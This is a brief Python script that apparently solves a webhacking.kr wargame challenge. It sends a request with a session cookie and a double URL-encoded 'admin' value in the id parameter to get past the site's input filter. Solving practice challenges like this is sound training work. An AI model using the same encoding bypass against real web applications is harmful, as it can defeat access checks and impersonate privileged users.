import requests
from phpsessid import cookies

url ='https://webhacking.kr/challenge/web-11/?id=%25%36%31%25%36%34%25%36%44%25%36%39%25%36%45'
response = requests.get(url, cookies=cookies)
print(response.text)


